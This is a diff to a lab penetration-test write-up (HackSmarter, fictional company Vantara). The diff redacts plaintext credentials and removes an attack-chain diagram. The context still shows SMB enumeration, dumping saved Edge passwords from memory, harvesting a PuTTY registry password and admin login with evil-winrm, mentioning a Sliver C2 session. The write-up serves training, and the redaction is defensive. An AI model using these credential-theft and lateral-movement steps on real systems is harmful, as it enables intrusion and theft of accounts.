@@ -20,10 +20,6 @@ Vantara is a private company formed in 2024 by billionaire Blairo Maggi's nephew
 
 The client requested an assumed-breach penetration test to validate the security posture of the environment and identify any material risk before the next audit cycle.
 
-**Platform:** HackSmarter
-**Difficulty:** Medium
-**OS:** Windows 11 / Server 2025
-**IP:** `10.0.16.97` / `10.1.36.192`
 
 ---
 
@@ -39,46 +35,6 @@ The client requested an assumed-breach penetration test to validate the security
 
 ---
 
-## Attack Chain Summary
-
-```
-SMB Enum (jmorris) → IT Docs → WinRM → SharpChrome (failed, App-Bound Encryption)
-→ EdgeSnapper Memory Dump → svc_vdi Creds → RDP VDI Kiosk
-→ file:// Bypass → Sliver C2 → PuTTY Config → svc_vdi_mgmt (Admin)
-```
-
----
-
-## Attack Path Overview
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│  jmorris → SMB VantaraOps (READ/WRITE) → IT Docs               │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  WinRM → SharpChrome (failed) → EdgeSnapper → svc_vdi creds     │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  RDP as svc_vdi → Plant Operations VDI 4.2.1 (Kiosk)           │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  file:// Protocol Handler → runner.exe → Sliver MTLS Session    │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  putty.conf → svc_vdi_mgmt:56tyghbn%^TYGHBN → Full Admin        │
-└─────────────────────────────────────────────────────────────────┘
-```
-
----
-
 # Enumeration
 
 ## SMB Share Enumeration
@@ -86,12 +42,12 @@ SMB Enum (jmorris) → IT Docs → WinRM → SharpChrome (failed, App-Bound Encr
 Authenticate as `jmorris` and enumerate accessible SMB shares. The `-signing:False` flag in the output is a critical finding — when SMB message signing is not enforced, an attacker can perform NTLM relay attacks without cracking any hashes.
 
 ```bash
-nxc smb 10.0.16.97 -u jmorris -p 'Fabricat!on2024' --shares
+nxc smb 10.0.16.97 -u jmorris -p '<redacted>' --shares
 ```
 
 ```
 SMB         10.0.16.97      445    VANTARAOPS       [*] Windows 11 / Server 2025 Build 26100 x64 (name:VANTARAOPS) (domain:VantaraOps) (signing:False) (SMBv1:None)
-SMB         10.0.16.97      445    VANTARAOPS       [+] VantaraOps\jmorris:Fabricat!on2024
+SMB         10.0.16.97      445    VANTARAOPS       [+] VantaraOps\jmorris:<redacted>
 SMB         10.0.16.97      445    VANTARAOPS       [*] Enumerated shares
 SMB         10.0.16.97      445    VANTARAOPS       Share           Permissions     Remark
 SMB         10.0.16.97      445    VANTARAOPS       -----           -----------     ------
@@ -141,7 +97,7 @@ Three key findings: SMB signing not required (NTLM relay potential), RDP exposed
 `spider_plus` recursively crawls all accessible share content and saves file metadata to a structured JSON file — far faster than manually listing subdirectories.
 
 ```bash
-nxc smb 10.0.16.97 -u jmorris -p 'Fabricat!on2024' -M spider_plus
+nxc smb 10.0.16.97 -u jmorris -p '<redacted>' -M spider_plus
 ```
 
 ```
@@ -240,7 +196,7 @@ SharpChrome extracts browser saved-login databases by decrypting the SQLite `Log
   v1.12.0
 
 [*] Action: Edge Saved Logins Triage
-[*] Using AES State Key: 96315A097990CB06BA72696ACBCCF2A499261FDE79DD8D2191BCAF8EE088212F]
+[*] Using AES State Key: <redacted>]
 [*] Triaging Edge Logins for current user
 
 [!] Unhandled SharpChrome exception:
@@ -276,19 +232,19 @@ Since App-Bound Encryption protects credentials on disk, the approach shifts to 
 [*] Scanning frozen snapshot regions...
 ------------------------------------------
 Username/eMail: jmorris
-Password:       JFH823*&%^&21jdsf823&$*sjksa812723
+Password:       <redacted>
 ------------------------------------------
 Username/eMail: jmorris
-Password:       1qazxsw2!QAZXSW@
+Password:       <redacted>
 ------------------------------------------
 Username/eMail: sburns
-Password:       875&%(#@hjdJFU823kFKh8234
+Password:       <redacted>
 ------------------------------------------
 Username/eMail: jmorris
-Password:       Fabricat!on2025
+Password:       <redacted>
 ------------------------------------------
 Username/eMail: svc_vdi
-Password:       V@ntara#Ops1
+Password:       <redacted>
 
 [*] Task complete.
 ```
@@ -298,17 +254,17 @@ Five credential sets recovered. The most significant: **`svc_vdi`** — a servic
 ## Credential Validation
 
 ```bash
-nxc smb 10.1.36.192 -u svc_vdi -p 'V@ntara#Ops1'
+nxc smb 10.1.36.192 -u svc_vdi -p '<redacted>'
 ```
 
 ```
 SMB         10.1.36.192     445    VANTARAOPS       [*] Windows 11 / Server 2025 Build 26100 x64 (name:VANTARAOPS) (domain:VantaraOps) (signing:False) (SMBv1:None)
-SMB         10.1.36.192     445    VANTARAOPS       [+] VantaraOps\svc_vdi:V@ntara#Ops1
+SMB         10.1.36.192     445    VANTARAOPS       [+] VantaraOps\svc_vdi:<redacted>
 ```
 
 Authentication succeeded against a second host — valid lateral movement credentials confirmed.
 
-**Credentials:** `svc_vdi` : `V@ntara#Ops1`
+**Credentials:** `svc_vdi` : `<redacted>`
 
 ---
 
@@ -426,12 +382,12 @@ Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Nam
 Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name Protocol   -Value "ssh"
 Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name PortNumber -Value 22
 Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name UserName   -Value "svc_vdi_mgmt"
-Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name Password   -Value "56tyghbn%^TYGHBN"
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name Password   -Value "<redacted>"
 ```
 
 PuTTY does not natively support a `Password` registry value — this credential was written as part of a provisioning script and never cleaned up. The target host `10.10.10.25` matches the IP from the helpdesk log (`tricci — Printer offline — 10.10.10.25`), confirming it is a live internal system.
 
-**Credentials:** `svc_vdi_mgmt` : `56tyghbn%^TYGHBN`
+**Credentials:** `svc_vdi_mgmt` : `<redacted>`
 
 ---
 
@@ -440,7 +396,7 @@ PuTTY does not natively support a `Password` registry value — this credential 
 ## WinRM Access and Administrative Privilege Confirmation
 
 ```bash
-evil-winrm -i 10.1.36.192 -u svc_vdi_mgmt -p '56tyghbn%^TYGHBN'
+evil-winrm -i 10.1.36.192 -u svc_vdi_mgmt -p '<redacted>'
 ```
 
 ```
@@ -486,15 +442,15 @@ Full control of the host achieved. Engagement objectives met.
 ```
 Phase 1 - Initial Access
 ────────────────────────────────────────────────────────────────
-jmorris         : Fabricat!on2024           → Provided (assumed breach)
+jmorris         : <redacted>           → Provided (assumed breach)
 
 Phase 2 - Lateral Movement
 ────────────────────────────────────────────────────────────────
-svc_vdi         : V@ntara#Ops1             → EdgeSnapper memory dump
+svc_vdi         : <redacted>             → EdgeSnapper memory dump
 
 Phase 3 - Privilege Escalation
 ────────────────────────────────────────────────────────────────
-svc_vdi_mgmt    : 56tyghbn%^TYGHBN         → PuTTY provisioning script
+svc_vdi_mgmt    : <redacted>         → PuTTY provisioning script
 ```
 
 ---
